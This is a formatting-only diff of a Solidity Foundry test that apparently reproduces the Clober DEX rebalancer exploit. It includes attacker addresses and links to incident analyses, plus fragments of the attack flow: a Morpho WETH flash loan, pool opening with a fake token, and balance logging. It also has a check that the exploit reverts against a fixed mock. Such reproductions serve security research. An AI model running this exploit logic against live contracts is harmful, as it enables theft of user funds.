@@ -5,7 +5,6 @@ import "../basetest.sol";
 import "../interface.sol";
 import "./MockRebalancerFixed.sol"; // Includes IBookManager, IERC20, etc.
 
-
 // @KeyInfo - Total Lost : ~ $501 K US$ (133.7 WETH)
 // Attacker : https://basescan.org/address/0x012Fc6377F1c5CCF6e29967Bce52e3629AaA6025
 // Attack Contract : https://basescan.org/address/0x32Fb1BedD95BF78ca2c6943aE5AEaEAAFc0d97C1
@@ -20,8 +19,6 @@ import "./MockRebalancerFixed.sol"; // Includes IBookManager, IERC20, etc.
 // Certik : https://www.certik.com/resources/blog/clober-dex-incident-analysis
 // PeckShield : https://x.com/peckshield/status/1866443215186088048
 // SolidityScan : https://blog.solidityscan.com/cloberdex-liquidity-vault-hack-analysis-f22eb960aa6f
-
-
 
 contract CloberDex is BaseTestWithBalanceLog {
     uint256 public blocknumToForkFrom = 23_514_451 - 1;
@@ -68,9 +65,9 @@ contract CloberDex is BaseTestWithBalanceLog {
         try this.testExploit() {
             fail(); // Fail if testExploit does NOT revert
         } catch Error(string memory reason) {
-            emit log_string(reason);  // revert reason string
+            emit log_string(reason); // revert reason string
         } catch (bytes memory lowLevelData) {
-            emit log_bytes(lowLevelData);  // raw revert data (e.g. custom errors)
+            emit log_bytes(lowLevelData); // raw revert data (e.g. custom errors)
         }
     }
 
@@ -84,7 +81,9 @@ contract CloberDex is BaseTestWithBalanceLog {
 
         morpho.flashLoan(weth, amountToHack, "0");
 
-        emit log_named_decimal_uint("Exploit Contract WETH Balance After exploit:", IERC20(weth).balanceOf(address(this)) / 1e18, 0);
+        emit log_named_decimal_uint(
+            "Exploit Contract WETH Balance After exploit:", IERC20(weth).balanceOf(address(this)) / 1e18, 0
+        );
         emit log_named_decimal_uint("Rebalancer WETH Balance After exploit:", IERC20(weth).balanceOf(rebalancer), 18);
 
         IERC20(weth).withdraw(rebalancerWETH);
@@ -101,18 +100,18 @@ contract CloberDex is BaseTestWithBalanceLog {
             base: base,
             unitSize: 1,
             quote: quote,
-            makerPolicy: FeePolicy.wrap(8888608),
+            makerPolicy: FeePolicy.wrap(8_888_608),
             hooks: hooks,
-            takerPolicy: FeePolicy.wrap(8888708)
+            takerPolicy: FeePolicy.wrap(8_888_708)
         });
 
         IBookManager.BookKey memory bookKeyB = IBookManager.BookKey({
             base: quote,
             unitSize: 1,
             quote: base,
-            makerPolicy: FeePolicy.wrap(8888608),
+            makerPolicy: FeePolicy.wrap(8_888_608),
             hooks: hooks,
-            takerPolicy: FeePolicy.wrap(8888708)
+            takerPolicy: FeePolicy.wrap(8_888_708)
         });
 
         bytes32 poolKey = rebalancerContract.open(bookKeyA, bookKeyB, "1", address(this));
@@ -156,7 +155,9 @@ contract FakeToken {
         balances[msg.sender] = totalSupply;
     }
 
-    function balanceOf(address account) public view returns (uint256) {
+    function balanceOf(
+        address account
+    ) public view returns (uint256) {
         return balances[account];
     }
 
